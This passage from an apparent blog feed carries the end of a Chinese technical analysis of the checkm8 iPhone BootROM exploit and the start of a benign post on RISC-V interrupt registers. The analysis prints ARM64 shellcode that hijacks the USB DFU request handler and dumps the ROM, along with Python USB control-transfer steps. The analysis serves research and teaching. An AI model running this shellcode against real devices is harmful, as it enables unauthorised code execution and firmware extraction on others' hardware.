  <span class="n">MOV</span>  <span class="n">X2</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
  <span class="n">LDR</span>  <span class="n">X3</span><span class="p">,</span> <span class="o">=</span><span class="n">PAYLOAD_SIZE</span>    <span class="c1">//576</span>
  <span class="n">LDR</span>  <span class="n">X4</span><span class="p">,</span> <span class="o">=</span><span class="n">PAYLOAD_PTR</span>     <span class="c1">//0x180088B48，usb_dfu_interface_instance.handle_request函数指针</span>
  <span class="n">ADD</span>  <span class="n">X5</span><span class="p">,</span> <span class="n">X0</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x18</span>        <span class="c1">//绿色部分，处理usb报文格式，从usb_0xA1_2_arm64.S的LDRH W2, [X0]开始执行</span>
  <span class="n">STR</span>  <span class="n">X5</span><span class="p">,</span> <span class="p">[</span><span class="n">X4</span><span class="p">]</span>             <span class="c1">//覆盖usb_dfu_interface_instance.handle_request函数指针，劫持usb数据包处理句柄</span>
                            <span class="c1">//usb数据包被导向绿色部分</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%BA%AFshellcode.jpg" alt="checkm8-纯shellcode.jpg" /></p>

<p><strong>5. 拷贝USB功能代码</strong></p>

<p>shellcode中的蓝色和绿色部分被拷贝到BOOT_TRAMPOLINE内存区域。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">copy_loop:</span>
  <span class="n">LDP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X1</span><span class="p">]</span>        <span class="c1">//把蓝色和绿色阶段拷贝到0x1800AFC00 tramploit页面</span>
  <span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X0</span><span class="p">]</span>        <span class="c1">//X0 = 0x1800AFC00 其中前0x18字节是蓝色阶段，绿色阶段是usb处理句柄</span>
  <span class="n">LDP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X1</span><span class="p">,</span><span class="err">#</span><span class="mh">0x10</span><span class="p">]</span>
  <span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X0</span><span class="p">,</span><span class="err">#</span><span class="mh">0x10</span><span class="p">]</span>
  <span class="n">LDP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X1</span><span class="p">,</span><span class="err">#</span><span class="mh">0x20</span><span class="p">]</span>
  <span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X0</span><span class="p">,</span><span class="err">#</span><span class="mh">0x20</span><span class="p">]</span>
  <span class="n">LDP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X1</span><span class="p">,</span><span class="err">#</span><span class="mh">0x30</span><span class="p">]</span>
  <span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X0</span><span class="p">,</span><span class="err">#</span><span class="mh">0x30</span><span class="p">]</span>
  <span class="n">DC</span>   <span class="n">CIVAC</span><span class="p">,</span> <span class="n">X0</span>            <span class="c1">//清除X0指向的内存地址的缓存</span>
  <span class="n">DMB</span>  <span class="n">SY</span>                   <span class="c1">//屏障指令</span>
  <span class="n">ADD</span>  <span class="n">X0</span><span class="p">,</span> <span class="n">X0</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x40</span>        <span class="c1">//dst += 0x40</span>
  <span class="n">ADD</span>  <span class="n">X1</span><span class="p">,</span> <span class="n">X1</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x40</span>        <span class="c1">//src += 0x40</span>
  <span class="n">ADD</span>  <span class="n">X2</span><span class="p">,</span> <span class="n">X2</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x40</span>        <span class="c1">//count += 0x40</span>
  <span class="n">CMP</span>  <span class="n">X2</span><span class="p">,</span> <span class="n">X3</span>               <span class="c1">//如果count &lt; size，向前跳转</span>
  <span class="n">B</span><span class="p">.</span><span class="n">CC</span> <span class="n">copy_loop</span>
</code></pre></div></div>

<p>47000058E0001FD6是“LDR X7, [PC, #8]; BR X7”汇编指令的机器码。</p>

<p>0x17FFFFFC是“B #-10”汇编指令的机器码。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-shellcode%E5%8C%85%E5%90%ABusb%E5%8A%9F%E8%83%BD%E4%BB%A3%E7%A0%81.jpg" alt="checkm8-shellcode包含usb功能代码.jpg" /></p>

<p>完成代码拷贝后清空流水线，确保CPU能正确加载运行USB功能代码。</p>

<p>最后返回SecureROM，shellcode的任务完成。</p>

<p>后面设备一旦接收到USB DFU数据包，便会被劫持到攻击者自定义的代码中，实现各种功能，例如把SecureROM整个dump出来、把iPhone设备的安全性降级等等。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">SYS</span>  <span class="err">#</span><span class="mi">0</span><span class="p">,</span> <span class="n">c7</span><span class="p">,</span> <span class="n">c5</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>       <span class="c1">//IC IALLUIS，修改代码或加载新代码后，确保所有核心使用最新的指令，而不是旧的缓存指令。</span>
 <span class="n">DSB</span>  <span class="n">SY</span>                   <span class="c1">//屏障指令</span>
 <span class="n">ISB</span>                       <span class="c1">//清空处理器流水线，确保后续指令从内存中重新加载</span>
                            <span class="c1">//3条指令通常组合使用，确保在多核系统中内存和指令缓存的一致性</span>
 <span class="n">LDP</span>  <span class="n">X29</span><span class="p">,</span> <span class="n">X30</span><span class="p">,</span> <span class="p">[</span><span class="n">SP</span><span class="p">],</span><span class="err">#</span><span class="mh">0x10</span> <span class="c1">//返回SecureROM</span>
 <span class="n">RET</span>
</code></pre></div></div>

<h1 id="功能扩展">功能扩展</h1>

<p><strong>1. 自定义USB报文处理句柄</strong></p>

<p>上面提到，shellcode把usb_dfu_interface_instance.handle_request覆盖为0x1800AFC18。该指针原来指向handle_interface_request函数，实现了DFU下载功能。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">handle_interface_request</span><span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_request</span> <span class="o">*</span><span class="n">request</span><span class="p">,</span> 
								<span class="kt">uint8_t</span> <span class="o">**</span><span class="n">out_buffer</span><span class="p">);</span>
</code></pre></div></div>

<p>bmRequestType=0xa1且bRequest=2是攻击者自定义的恶意功能指令。</p>

<p>若收到的是正常的DFU数据包，则通过0x1800AC000 ~ 0x1800AC014这段跳板代码路由到正常的处理逻辑，把数据包交给handle_interface_request函数处理。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_08.16.25.png" alt="截屏2025-03-12 08.16.25.png" /></p>

<p><strong>2. 对正常DFU报文的处理</strong></p>

<p>以—dump-rom参数的实现为例子，主机首先向设备发送正常的DFU请求，其中bmRequestType=0x21， bRequest=1。该请求经过跳板代码路由到handle_interface_request函数处理。其中data参数包含了将要dump的地址范围，设备接收到data参数之后保存在0x1800B0000。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="c1">#print 'Sending 0x%x of data to device.' % len(data)
</span>    <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
        <span class="n">amount</span> <span class="o">=</span> <span class="nf">min</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">-</span> <span class="n">index</span><span class="p">,</span> <span class="n">MAX_PACKET_SIZE</span><span class="p">)</span>
        <span class="k">assert</span> <span class="n">device</span><span class="p">.</span><span class="nf">ctrl_transfer</span><span class="p">(</span><span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">index</span><span class="p">:</span><span class="n">index</span> <span class="o">+</span> <span class="n">amount</span><span class="p">],</span> <span class="mi">5000</span><span class="p">)</span> <span class="o">==</span> <span class="n">amount</span>
        <span class="n">index</span> <span class="o">+=</span> <span class="n">amount</span>
</code></pre></div></div>

<p><strong>3. 对攻击指令的处理</strong></p>

<p>接着主机向设备发送恶意功能指令，其中bmRequestType=0xa1，bRequest=2，wValue=0xFFFF，该数据包交给USB功能代码处理。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">response</span> <span class="o">=</span> <span class="n">device</span><span class="p">.</span><span class="nf">ctrl_transfer</span><span class="p">(</span><span class="mh">0xA1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0xFFFF</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">response_length</span><span class="p">,</span> \
						<span class="n">CMD_TIMEOUT</span><span class="p">).</span><span class="nf">tostring</span><span class="p">()</span>
</code></pre></div></div>

<p>若wValue=0xFFFF，</p>

<p>从0x1800B0000读取保存的参数，根据参数的前8个字节判断要执行的指令。</p>

<p>—dump-rom的magic是“memcmemc”。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">STP</span>  <span class="n">X29</span><span class="p">,</span> <span class="n">X30</span><span class="p">,</span> <span class="p">[</span><span class="n">SP</span><span class="p">,</span><span class="err">#</span><span class="o">-</span><span class="mh">0x10</span><span class="p">]</span><span class="o">!</span>   <span class="p">;</span> <span class="err">保存</span><span class="n">fp</span> <span class="err">、</span><span class="n">lr</span>
<span class="n">MOV</span>  <span class="n">X29</span><span class="p">,</span> <span class="n">SP</span>
<span class="n">STP</span>  <span class="n">X20</span><span class="p">,</span> <span class="n">X19</span><span class="p">,</span> <span class="p">[</span><span class="n">SP</span><span class="p">,</span><span class="err">#</span><span class="o">-</span><span class="mh">0x10</span><span class="p">]</span><span class="o">!</span>

<span class="n">MOV</span>  <span class="n">X19</span><span class="p">,</span> <span class="n">X0</span>            <span class="p">;</span> <span class="n">usb_device_request</span>
<span class="n">LDR</span>  <span class="n">X20</span><span class="p">,</span> <span class="o">=</span><span class="n">LOAD_ADDRESS</span> <span class="p">;</span> <span class="mh">0x1800B0000</span><span class="p">,</span> <span class="err">全局指针</span><span class="n">image_buffer</span><span class="err">，</span>
												<span class="p">;</span><span class="err">在正常情况下保存接收到的</span><span class="n">dfu</span><span class="err">镜像</span><span class="p">,</span> <span class="err">系统被劫持后保存攻击者请求参数</span>
<span class="n">MOV</span>  <span class="n">W1</span><span class="p">,</span> <span class="err">#</span><span class="mh">0xFFFF</span>
<span class="n">LDRH</span> <span class="n">W2</span><span class="p">,</span> <span class="p">[</span><span class="n">X19</span><span class="p">,</span><span class="err">#</span><span class="mi">2</span><span class="p">]</span>       <span class="p">;</span><span class="k">if</span><span class="p">(</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">wValue</span> <span class="o">!=</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="k">goto</span> <span class="n">request_done</span>
<span class="n">CMP</span>  <span class="n">W1</span><span class="p">,</span> <span class="n">W2</span>
<span class="n">BNE</span>  <span class="n">request_done</span>       <span class="p">;</span> <span class="err">如果</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">wValue</span> <span class="o">==</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="err">那就执行功能代码</span>

<span class="n">LDR</span>  <span class="n">X0</span><span class="p">,</span> <span class="p">[</span><span class="n">X20</span><span class="p">]</span>          <span class="p">;</span> <span class="n">X0</span> <span class="o">=</span> <span class="n">LOAD_ADDRESS</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="err">取出</span><span class="n">magic</span> <span class="n">number</span><span class="p">,</span> <span class="err">判断是哪条命令</span>
</code></pre></div></div>

<p>—dump-rom调用自定义的memcpy函数，把固件代码段拷贝到0x1800B0000，并且在头部加上“donedone”字符串表示成功执行。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> <span class="o">--</span><span class="n">dump</span><span class="o">-</span><span class="n">rom</span><span class="err">功能的实现</span>

<span class="n">STR</span>  <span class="n">XZR</span><span class="p">,</span> <span class="p">[</span><span class="n">X20</span><span class="p">]</span>     

<span class="n">LDP</span>  <span class="n">X0</span><span class="p">,</span> <span class="n">X1</span><span class="p">,</span> <span class="p">[</span><span class="n">X20</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x10</span><span class="p">]</span>    <span class="p">;</span> <span class="n">X0</span><span class="o">=</span><span class="n">dest</span><span class="p">,</span> <span class="n">X1</span><span class="o">=</span><span class="n">src</span>
<span class="n">LDR</span>  <span class="n">X2</span><span class="p">,</span> <span class="p">[</span><span class="n">X20</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x20</span><span class="p">]</span>        <span class="p">;</span> <span class="n">X2</span><span class="o">=</span><span class="n">length</span>
<span class="n">BL</span>   <span class="n">memcpy</span>

<span class="n">LDR</span>  <span class="n">X8</span><span class="p">,</span> <span class="o">=</span><span class="n">DONE_MAGIC</span>
<span class="n">STR</span>  <span class="n">X8</span><span class="p">,</span> <span class="p">[</span><span class="n">X20</span><span class="p">]</span>               <span class="p">;</span> <span class="err">消息头部加上</span><span class="n">DONE</span><span class="err">标识</span>
<span class="n">B</span>    <span class="n">request_done</span>            <span class="p">;</span> <span class="err">加入传输队列</span>
</code></pre></div></div>

<p>最后调用usb_core_do_transfer(EP0_IN, 0x1800B0000, wLength, 0)创建一个IO任务加入EP0_IN端点的任务队列中，把获取到的固件发送给主机。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">request_done:</span>
  <span class="n">MOV</span>  <span class="n">W0</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x80</span>            <span class="p">;</span> <span class="n">EP0_IN</span>
  <span class="n">MOV</span>  <span class="n">X1</span><span class="p">,</span> <span class="n">X20</span>              <span class="p">;</span> <span class="n">LOAD_ADDRESS</span> <span class="mh">0x1800B0000</span>
  <span class="n">LDRH</span> <span class="n">W2</span><span class="p">,</span> <span class="p">[</span><span class="n">X19</span><span class="p">,</span><span class="err">#</span><span class="mi">6</span><span class="p">]</span>         <span class="p">;</span> <span class="n">request</span><span class="o">-&gt;</span><span class="n">wLength</span>
  <span class="n">MOV</span>  <span class="n">X3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>               <span class="p">;</span> <span class="mi">0</span>
  <span class="n">LDR</span>  <span class="n">X4</span><span class="p">,</span> <span class="o">=</span><span class="n">USB_CORE_DO_IO</span>  <span class="p">;</span> <span class="n">usb_core_do_transfer</span>
  <span class="n">BLR</span>  <span class="n">X4</span>

  <span class="n">MOV</span>  <span class="n">W0</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
  <span class="n">LDP</span>  <span class="n">X20</span><span class="p">,</span> <span class="n">X19</span><span class="p">,</span> <span class="p">[</span><span class="n">SP</span><span class="p">],</span><span class="err">#</span><span class="mh">0x10</span>
  <span class="n">LDP</span>  <span class="n">X29</span><span class="p">,</span> <span class="n">X30</span><span class="p">,</span> <span class="p">[</span><span class="n">SP</span><span class="p">],</span><span class="err">#</span><span class="mh">0x10</span>
  <span class="n">RET</span>
</code></pre></div></div>

<h1 id="事件回顾">事件回顾</h1>

<h2 id="checkm8能力及威胁评估">checkm8<strong>能力及威胁评估</strong></h2>

<ul>
  <li>漏洞具备的能力
    <ul>
      <li>checkm8位于BootROM中，不可被修复</li>
      <li>在BootROM中具备任意代码执行能力，提供了越狱的能力</li>
      <li>开启CPU的JTAG调试功能，使研究人员可以对苹果设备进行更加深入的研究</li>
      <li>控制iBoot的解密过程，从内存中提取解密后的iBoot</li>
      <li>硬件漏洞的生命周期很长，是当前越狱老版本苹果设备的主要办法，如果是软件漏洞可能几天就被补上了</li>
    </ul>
  </li>
  <li>漏洞的局限性
    <ul>
      <li>需要使用USB物理访问手机，无法远程执行</li>
      <li>只能在手机引导时进行操作，仅存在于运行时内存，重启后恢复原样</li>
      <li>ipwndfu集成的checkm8目前只是漏洞利用工具，并不具备越狱功能</li>
      <li>无法突破用户数据的加密保护，文件系统、用户数据和生物ID被Secure Enclave加密保护</li>
    </ul>
  </li>
</ul>

<p>iPhone安全性的一些小知识：</p>

<p><strong>SEP</strong>（Secure Enclave Processor，安全区域处理器）是iPhone和其他苹果设备中的一个独立硬件安全模块，专门用于处理和保护敏感数据。它是苹果设备安全架构的核心组成部分，与A系列芯片紧密结合。</p>

<p><strong>SEP的作用：</strong></p>

<ol>
  <li><strong>存储和处理敏感数据</strong>：
    <ul>
      <li><strong>生物识别数据</strong>：如Touch ID的指纹信息和Face ID的面容信息。</li>
      <li><strong>支付信息</strong>：如Apple Pay的支付令牌和加密密钥。</li>
      <li><strong>密码和密钥</strong>：如设备解锁密码、文件加密密钥等。</li>
    </ul>
  </li>
  <li><strong>加密和安全操作</strong>：
    <ul>
      <li>生成和存储设备唯一的加密密钥（基于UID）。</li>
      <li>执行加密和解密操作，确保数据在传输和存储过程中的安全性。</li>
      <li>管理设备的激活锁（Activation Lock）和查找我的iPhone（Find My iPhone）功能。</li>
    </ul>
  </li>
  <li><strong>隔离和保护</strong>：
    <ul>
      <li>SEP是一个独立的协处理器，与主处理器（CPU）隔离，确保即使主系统被攻破，SEP中的数据仍然安全。</li>
      <li>它有自己的安全启动过程和固件，防止未经授权的访问。</li>
    </ul>
  </li>
  <li><strong>验证和认证</strong>：
    <ul>
      <li>验证Touch ID和Face ID的合法性，确保只有授权用户可以访问设备。</li>
      <li>在Apple Pay交易中，验证支付请求的合法性并生成动态安全码。</li>
    </ul>
  </li>
</ol>

<p><strong>SEP的工作原理</strong></p>

<ol>
  <li><strong>硬件隔离</strong>：
    <ul>
      <li>SEP是一个独立的硬件模块，集成在A系列芯片中。</li>
      <li>它与主处理器通过加密通道通信，确保数据在传输过程中不被窃取或篡改。</li>
    </ul>
  </li>
  <li><strong>唯一密钥（UID）</strong>：
    <ul>
      <li>每个SEP都有一个基于设备UID的唯一加密密钥。</li>
      <li>这些密钥用于加密和解密SEP中的数据，且无法被导出或复制。</li>
    </ul>
  </li>
  <li><strong>安全启动</strong>：
    <ul>
      <li>SEP有自己的安全启动过程，确保其固件未被篡改。</li>
      <li>只有在验证固件签名后，SEP才会启动。</li>
    </ul>
  </li>
  <li><strong>防暴力破解</strong>：
    <ul>
      <li>SEP具有防暴力破解机制，例如在多次错误的指纹或面容识别尝试后，会锁定生物识别功能。</li>
      <li>它还支持延迟响应和擦除数据功能，进一步增强安全性。</li>
    </ul>
  </li>
</ol>

<p><strong>SEP的应用场景</strong></p>

<ol>
  <li><strong>Touch ID和Face ID</strong>：
    <ul>
      <li>SEP存储和处理生物识别数据，确保这些数据不会被泄露或滥用。</li>
      <li>它还会验证生物识别的合法性，防止伪造或欺骗。</li>
    </ul>
  </li>
  <li><strong>Apple Pay</strong>：
    <ul>
      <li>SEP生成和管理支付令牌，确保支付过程的安全性。</li>
      <li>它还会验证支付请求的合法性，并生成动态安全码。</li>
    </ul>
  </li>
  <li><strong>设备加密</strong>：
    <ul>
      <li>SEP管理设备文件系统的加密密钥，确保用户数据在设备丢失或被盗时不会被访问。</li>
    </ul>
  </li>
  <li><strong>激活锁和查找我的iPhone</strong>：
    <ul>
      <li>SEP与设备的激活锁绑定，确保即使设备被擦除，也无法绕过Apple ID激活。</li>
    </ul>
  </li>
</ol>

<p><strong>SEP的安全性</strong></p>

<ol>
  <li><strong>硬件级保护</strong>：
    <ul>
      <li>SEP是一个独立的硬件模块，与主系统隔离，防止软件攻击。</li>
    </ul>
  </li>
  <li><strong>加密通信</strong>：
    <ul>
      <li>所有与SEP的通信都经过加密，防止数据被窃取或篡改。</li>
    </ul>
  </li>
  <li><strong>防物理攻击</strong>：
    <ul>
      <li>SEP的设计考虑了物理攻击的防护，例如侧信道攻击和硬件拆解。</li>
    </ul>
  </li>
</ol>

<hr />

<p><a href="https://support.apple.com/zh-cn/guide/security/sec59b0b31ff/web">安全隔区</a></p>

<h2 id="事件后续">事件后续</h2>

<ul>
  <li>苹果官方处理</li>
</ul>

<p>迅速采取法律手段，要求GitHub和其他平台删除泄漏的源码。</p>

<p>要求相关方遵守《数字千年版权法案》（<a href="https://zh.wikipedia.org/zh-cn/%E6%95%B8%E5%AD%97%E5%8D%83%E5%B9%B4%E7%89%88%E6%AC%8A%E6%B3%95">DMCA</a>）</p>

<ul>
  <li>
    <p>后续有人申请了漏洞编号<a href="https://www.kb.cert.org/vuls/id/941987/">CVE-2019-8900</a></p>
  </li>
  <li>
    <p>事了拂衣去，深藏功与名</p>
  </li>
</ul>

<p>各国情报部门、军队、安全研究人员、果粉、越狱爱好者和吃瓜群众的狂欢</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/EG91kipUEAAtlh4.jpeg" alt="EG91kipUEAAtlh4.jpeg" /></p>

<h1 id="参考资料">参考资料</h1>

<p><a href="https://xuanxuanblingbling.github.io/ios/2020/07/10/checkm8/">Checkm8 漏洞研究</a></p>

<p><a href="https://habr.com/en/companies/dsec/articles/472762/">Technical analysis of the checkm8 exploit</a></p>

<p><a href="https://alfiecg.uk/2023/07/21/A-comprehensive-write-up-of-the-checkm8-BootROM-exploit.html#usb-initialisation">A comprehensive write-up of the checkm8 BootROM exploit</a></p>

<p><a href="https://axleos.com/exploiting-the-iphone-4-part-1-gaining-entry/">Exploiting the iPhone 4, Part 1: Gaining Entry</a></p>

<p><a href="https://re.alisa.sh/notes/iBoot-heap-internals.html">iBoot堆结构</a></p>

<p><a href="https://re.alisa.sh/notes/iBoot-address-space.html">iBoot地址空间</a></p>

<p><a href="https://newosxbook.com/home.html">*OS Internals: - Welcome! 这个论坛介绍了很多iOS知识👍</a></p>

<p><a href="https://www.theiphonewiki.com/">iPhone Wiki 这里面包含了很多漏洞利用知识和代码</a></p>

<p><a href="https://www.usbzh.com/">USB中文网</a></p>

<h1 id="附件">附件</h1>

<p><a href="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E5%A0%86%E6%A8%A1%E6%8B%9F%E5%99%A8.zip">堆模拟器.zip</a></p>

<p><a href="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/uEmu-master.zip">uEmu-master.zip</a></p>]]></content><author><name></name></author><category term="hardware" /><summary type="html"><![CDATA[checkm8是影响苹果A5～A11系列芯片的bootrom漏洞，该漏洞位于USB协议栈，包含了一个释放后重引用漏洞和一个内存泄漏bug。攻击者利用checkm8可以实现bootrom级别的任意代码执行，破坏设备的安全启动链，实现苹果设备固件dump和系统越狱。漏洞在生产阶段已经固化在芯片的ROM区域，无法通过软件更新来修补。]]></summary></entry><entry><title type="html">几个中断寄存器的关系</title><link href="http://localhost:4000/riscv/2025/05/11/%E5%87%A0%E4%B8%AA%E4%B8%AD%E6%96%AD%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84%E5%85%B3%E7%B3%BB.html" rel="alternate" type="text/html" title="几个中断寄存器的关系" /><published>2025-05-11T13:27:38+08:00</published><updated>2025-05-11T13:27:38+08:00</updated><id>http://localhost:4000/riscv/2025/05/11/%E5%87%A0%E4%B8%AA%E4%B8%AD%E6%96%AD%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84%E5%85%B3%E7%B3%BB</id><content type="html" xml:base="http://localhost:4000/riscv/2025/05/11/%E5%87%A0%E4%B8%AA%E4%B8%AD%E6%96%AD%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84%E5%85%B3%E7%B3%BB.html"><![CDATA[<p>和中断相关的几个寄存器的含义和使用方法，以及相互之间的关系</p>

<h1 id="risc-v中断处理过程">RISC-V中断处理过程</h1>

<p><a href="https://blog.csdn.net/zyhse/article/details/141054966">RISC-V特权架构 - 时钟中断处理_riscv mtime-CSDN博客</a></p>

<p><a href="https://blog.csdn.net/m0_53157173/article/details/131364904">MIT 6.S081 教材第五章内容 – 中断与设备驱动–下_mit 6.s081有教材吗-CSDN博客</a></p>

<h1 id="mie寄存器-与-mstatusmie位">mie寄存器 与 mstatus.MIE位</h1>

<h3 id="1-核心功能"><strong>1. 核心功能</strong></h3>

<table>
  <thead>
    <tr>
      <th><strong>寄存器/位</strong></th>
      <th><strong>作用</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code></strong></td>
      <td><strong>全局中断开关</strong>：所有中断（包括M模式中断）的总使能。</td>
    </tr>
    <tr>
      <td><strong><code class="language-plaintext highlighter-rouge">mie</code></strong></td>
      <td><strong>局部中断开关</strong>：按中断类型（如定时器、外部、软件中断）分别控制是否使能。</td>
    </tr>
  </tbody>
</table>

<h3 id="2-中断触发的必要条件"><strong>2. 中断触发的必要条件</strong></h3>

<p>M模式下的中断（如定时器中断<strong><code class="language-plaintext highlighter-rouge">MTIP</code></strong>、外部中断<strong><code class="language-plaintext highlighter-rouge">MEIP</code></strong>）<strong>必须同时满足以下条件</strong>才会被响应：</p>

<ol>
  <li><strong>全局中断使能</strong>：<strong><code class="language-plaintext highlighter-rouge">mstatus.MIE = 1</code></strong>（总开关打开）。</li>
  <li><strong>局部中断使能</strong>：<strong><code class="language-plaintext highlighter-rouge">mie</code></strong>寄存器中对应中断类型的使能位为<strong><code class="language-plaintext highlighter-rouge">1</code></strong>（如<strong><code class="language-plaintext highlighter-rouge">mie.MTIE = 1</code></strong>允许定时器中断）。</li>
  <li><strong>中断未屏蔽</strong>：更高优先级的中断未阻塞当前中断（如无嵌套中断场景）。</li>
</ol>

<h3 id="3-关键字段详解"><strong>3. 关键字段详解</strong></h3>

<h3 id="1mstatusmie全局控制"><strong>(1) <code class="language-plaintext highlighter-rouge">mstatus.MIE</code>（全局控制）</strong></h3>

<ul>
  <li><strong>位置</strong>：<strong><code class="language-plaintext highlighter-rouge">mstatus</code></strong>寄存器的第3位。</li>
  <li><strong>行为</strong>：
    <ul>
      <li><strong><code class="language-plaintext highlighter-rouge">MIE=1</code></strong>：允许CPU响应所有中断（仍需<strong><code class="language-plaintext highlighter-rouge">mie</code></strong>对应位使能）。</li>
      <li><strong><code class="language-plaintext highlighter-rouge">MIE=0</code></strong>：禁止所有中断（即使<strong><code class="language-plaintext highlighter-rouge">mie</code></strong>中已使能）。</li>
    </ul>
  </li>
  <li><strong>场景</strong>：
    <ul>
      <li>在异常处理或关键代码段中，通过清除<strong><code class="language-plaintext highlighter-rouge">MIE</code></strong>屏蔽中断。</li>
    </ul>
  </li>
</ul>

<h3 id="2mie寄存器局部控制"><strong>(2) <code class="language-plaintext highlighter-rouge">mie</code>寄存器（局部控制）</strong></h3>

<ul>
  <li><strong>关键位</strong>（以标准RISC-V为例）：</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bit | 名称    | 作用
----|---------|-----------------------------
11  | MEIE    | 外部中断使能（如PLIC中断）
7   | MTIE    | 定时器中断使能（如CLINT）
3   | MSIE    | 软件中断使能
</code></pre></div></div>

<ul>
  <li><strong>行为</strong>：
    <ul>
      <li>每个中断类型有独立的使能位，需单独设置。</li>
    </ul>
  </li>
</ul>

<h3 id="4-交互流程示例"><strong>4. 交互流程示例</strong></h3>

<h3 id="场景m模式下响应定时器中断mtip"><strong>场景：M模式下响应定时器中断（<code class="language-plaintext highlighter-rouge">MTIP</code>）</strong></h3>

<ol>
  <li><strong>初始化设置</strong>：</li>
</ol>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">csrsi</span> <span class="nv">mstatus</span><span class="p">,</span> <span class="mh">0x8</span>     <span class="err">#</span> <span class="err">设置</span><span class="nv">mstatus.MIE</span><span class="err">=</span><span class="mi">1</span><span class="err">（全局使能）</span>
<span class="nf">csrsi</span> <span class="nv">mie</span><span class="p">,</span> <span class="mh">0x80</span>        <span class="err">#</span> <span class="err">设置</span><span class="nv">mie.MTIE</span><span class="err">=</span><span class="mi">1</span><span class="err">（定时器中断使能）</span>
</code></pre></div></div>

<ol>
  <li><strong>中断触发条件</strong>：
    <ul>
      <li>CLINT生成定时器中断（<strong><code class="language-plaintext highlighter-rouge">MTIP=1</code></strong>）。</li>
    </ul>
  </li>
  <li><strong>CPU响应中断</strong>：
    <ul>
      <li>检查<strong><code class="language-plaintext highlighter-rouge">mstatus.MIE &amp;&amp; mie.MTIE</code></strong>，若均为<strong><code class="language-plaintext highlighter-rouge">1</code></strong>，则跳转到<strong><code class="language-plaintext highlighter-rouge">mtvec</code></strong>指向的中断处理程序。</li>
    </ul>
  </li>
  <li><strong>中断处理中</strong>：
    <ul>
      <li>硬件自动清除<strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code></strong>（进入中断后默认关闭全局中断，防止嵌套）。</li>
      <li>处理完成后通过<strong><code class="language-plaintext highlighter-rouge">mret</code></strong>恢复<strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code></strong>（返回前可能手动重新使能）。</li>
    </ul>
  </li>
</ol>

<h3 id="5-典型问题与注意事项"><strong>5. 典型问题与注意事项</strong></h3>

